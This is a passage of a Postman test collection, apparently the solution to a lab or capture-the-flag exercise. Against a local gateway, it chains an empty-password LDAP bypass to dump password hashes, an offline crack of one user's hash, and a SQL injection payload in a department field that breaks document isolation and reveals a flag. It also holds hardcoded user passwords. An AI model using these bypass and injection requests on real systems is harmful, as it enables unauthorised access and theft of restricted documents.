{
  "info": {
    "name": "MATO — LDAP bypass to document isolation break",
    "description": "Run in order. Recover Bob’s password offline and set bobPassword locally before the Bob requests.",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "variable": [
    {
      "key": "gatewayUrl",
      "value": "http://localhost:8080"
    },
    {
      "key": "bobPassword",
      "value": ""
    }
  ],
  "item": [
    {
      "name": "1 · Anonymous users → 401",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/users",
        "description": "",
        "auth": {
          "type": "noauth"
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(401);"
            ]
          }
        }
      ]
    },
    {
      "name": "2 · Anonymous notes → 401",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/notes",
        "description": "",
        "auth": {
          "type": "noauth"
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(401);"
            ]
          }
        }
      ]
    },
    {
      "name": "3 · Admin empty password → hash roster",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/users",
        "description": "CVE-2026-41720 with permissive OpenLDAP. Copy bobHash into the local cracking helper.",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "mr.president",
              "type": "string"
            },
            {
              "key": "password",
              "value": "",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const bob = pm.response.json().find(u => u.username === 'bob');",
              "pm.expect(bob.passwordHash).to.match(/^\\$2[aby]\\$/);",
              "pm.collectionVariables.set('bobHash', bob.passwordHash);"
            ]
          }
        }
      ]
    },
    {
      "name": "4 · Admin notes → 403",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/notes",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "mr.president",
              "type": "string"
            },
            {
              "key": "password",
              "value": "",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(403);"
            ]
          }
        }
      ]
    },
    {
      "name": "5 · Bob notes → shared intel notes",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/notes",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "bob",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{bobPassword}}",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const notes = pm.response.json();",
              "pm.expect(notes.some(n => n.title === 'Briefing index')).to.be.true;",
              "pm.collectionVariables.set('intelNotes', JSON.stringify(notes));"
            ]
          }
        }
      ]
    },
    {
      "name": "6 · Maija notes → same notes",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/notes",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "m.lehtinen",
              "type": "string"
            },
            {
              "key": "password",
              "value": "d5jW#9pqL!2zX",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "pm.expect(JSON.stringify(pm.response.json())).to.equal(pm.collectionVariables.get('intelNotes'));"
            ]
          }
        }
      ]
    },
    {
      "name": "7 · Logistics notes → different notes",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/notes",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "r.dubois",
              "type": "string"
            },
            {
              "key": "password",
              "value": "Tr0ub4dor&3xZ!",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "pm.expect(pm.response.json().some(n => n.title === 'Fuel review')).to.be.true;",
              "pm.expect(pm.response.json().some(n => n.title === 'Briefing index')).to.be.false;"
            ]
          }
        }
      ]
    },
    {
      "name": "8 · Bob users → 403",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/users",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "bob",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{bobPassword}}",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(403);"
            ]
          }
        }
      ]
    },
    {
      "name": "9 · Normal intel search",
      "request": {
        "method": "POST",
        "url": "{{gatewayUrl}}/documents/search",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "bob",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{bobPassword}}",
              "type": "string"
            }
          ]
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"query\": \"briefing\",\n  \"department\": \"intel-analysis\"\n}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const docs = pm.response.json();",
              "pm.expect(docs.length).to.be.above(0);",
              "pm.expect(docs.every(d => JSON.parse(d.metadata).department === 'intel-analysis')).to.be.true;"
            ]
          }
        }
      ]
    },
    {
      "name": "10 · Foreign department → empty",
      "request": {
        "method": "POST",
        "url": "{{gatewayUrl}}/documents/search",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "bob",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{bobPassword}}",
              "type": "string"
            }
          ]
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"query\": \"briefing\",\n  \"department\": \"logistics-corps\"\n}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "pm.expect(pm.response.json()).to.be.an('array').that.is.empty;"
            ]
          }
        }
      ]
    },
    {
      "name": "11 · SQL injection → all departments",
      "request": {
        "method": "POST",
        "url": "{{gatewayUrl}}/documents/search",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "bob",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{bobPassword}}",
              "type": "string"
            }
          ]
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"query\": \"briefing\",\n  \"department\": \"intel-analysis' OR '1'='1\"\n}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const departments = new Set(pm.response.json().map(d => JSON.parse(d.metadata).department));",
              "['intel-analysis','logistics-corps','command-staff','field-operations','mato-special-ops'].forEach(d => pm.expect(departments.has(d)).to.be.true);",
              "pm.expect(pm.response.text()).to.include('FLAG{archive-isolation-broken-by-converter}');"
            ]
          }
        }
      ]
    },
    {
      "name": "12 · Safe query → empty",
      "request": {
